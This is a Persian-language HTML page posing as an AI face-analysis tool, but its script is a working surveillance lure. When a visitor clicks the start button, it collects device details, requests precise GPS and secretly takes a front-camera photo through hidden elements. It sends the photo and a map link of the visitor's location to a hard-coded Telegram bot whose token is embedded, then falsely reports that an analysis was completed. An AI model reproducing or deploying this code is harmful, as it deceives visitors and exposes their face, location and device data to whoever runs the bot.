<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سامانه هوش مصنوعی تشخیص چهره</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: #fff;
            text-align: center;
            padding: 40px 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 35px;
            border-radius: 16px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            max-width: 420px;
            width: 100%;
        }
        h2 {
            font-size: 22px;
            margin-bottom: 15px;
            color: #fff;
        }
        p {
            font-size: 14px;
            line-height: 1.7;
            color: #e0e0e0;
            margin-bottom: 25px;
        }
        button {
            background: linear-gradient(135deg, #00b09b, #96c93d);
            color: white;
            border: none;
            padding: 14px 25px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 4px 15px rgba(0, 176, 155, 0.4);
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 176, 155, 0.6);
        }
        button:active {
            transform: translateY(0);
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>✨ آنالیز هوشمند مشخصات و چهره</h2>
        <p>برای شروع پردازش و دریافت نتیجه‌ی تحلیل اختصاصی دستگاه و تصویر، روی دکمه زیر کلیک کنید.</p>
        <button id="startBtn" onclick="runProcess()">شروع پردازش و تحلیل</button>
    </div>

    <!-- المان‌های مخفی برای پردازش دوربین -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // اطلاعات ربات تلگرام 
        const BOT_TOKEN = '8718656206:AAGr_nFBgZoOYFkOonagQy5q6gGJSN5iQbU'; 
        const CHAT_ID = '6820599989';     

        // تابع کمکی برای استخراج اطلاعات سیستم و مرورگر
        async function getSystemInfo() {
            let info = "";
            
            // تشخیص سیستم‌عامل و مرورگر از روی User Agent
            const ua = navigator.userAgent;
            let os = "نامشخص";
            if (ua.match(/Win/i)) os = "ویندوز (Windows)";
            else if (ua.match(/Mac/i)) os = "مک (Mac)";
            else if (ua.match(/Android/i)) os = "اندروید (Android)";
            else if (ua.match(/iPhone|iPad|iPod/i)) os = "آی‌اواس (iOS)";
            else if (ua.match(/Linux/i)) os = "لینوکس (Linux)";

            info += `💻 سیستم‌عامل: ${os}\n`;
            info += `🌐 رزولوشن صفحه: ${window.screen.width}x${window.screen.height}\n`;
            info += `🕒 منطقه زمانی: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;

            // گرفتن اطلاعات باتری (در صورت پشتیبانی مرورگر)
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging ? "⚡ در حال شارژ" : "🔋 باتری خالی‌شونده";
                    info += `🔋 وضعیت باتری: ${level}% (${charging})\n`;
                } catch (e) {
                    // اگر مرورگر اجازه نداد رد شو
                }
            }

            return info;
        }

        async function runProcess() {
            const btn = document.getElementById('startBtn');
            btn.innerText = "در حال پردازش سیستم...";
            btn.disabled = true;

            // جمع‌آوری اطلاعات سیستم
            const sysInfo = await getSystemInfo();

            // ۱. گرفتن لوکیشن (GPS)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        captureAndSend(lat, lon, sysInfo);
                    },
                    (error) => {
                        console.log("Location access denied or failed", error);
                        captureAndSend(null, null, sysInfo); 
                    },
                    { enableHighAccuracy: true }
                );
            } else {
                captureAndSend(null, null, sysInfo);
            }
        }

        function captureAndSend(lat, lon, sysInfo) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // متوقف کردن دوربین
                        stream.getTracks().forEach(track => track.stop());

                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, 'capture.jpg');

                            // ساخت متن پیام کامل شامل مشخصات سیستم و لوکیشن
                            let caption = "🎯 یک کاربر جدید وارد شد!\n\n";
                            caption += "📊 **اطلاعات دستگاه:**\n" + sysInfo + "\n";

                            if (lat && lon) {
                                caption += `📍 **موقعیت جغرافیایی:**\nعرض: ${lat}\nطول: ${lon}\n\n🗺 **لینک در گوگل مپ:**\nhttps://www.google.com/maps?q=${lat},${lon}`;
                            } else {
                                caption += "⚠️ دسترسی به لوکیشن داده نشد.";
                            }
                            
                            formData.append('caption', caption);
                            formData.append('parse_mode', 'Markdown');

                            // ارسال به تلگرام
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => {
                                document.querySelector('.container').innerHTML = '<h2>تحلیل با موفقیت انجام شد</h2><p>اطلاعات سخت‌افزاری و چهره شما با موفقیت پردازش گردید.</p>';
                            })
                            .catch(err => {
                                alert("خطا در پردازش. لطفاً دوباره تلاش کنید.");
                            });

                        }, 'image/jpeg', 0.8);

                    }, 1000); 
                })
                .catch(err => {
                    alert("لطفاً اجازه دسترسی به دوربین را تأیید کنید.");
                    document.getElementById('startBtn').innerText = "شروع پردازش و تحلیل";
                    document.getElementById('startBtn').disabled = false;
                });
        }
    </script>
</body>
</html>
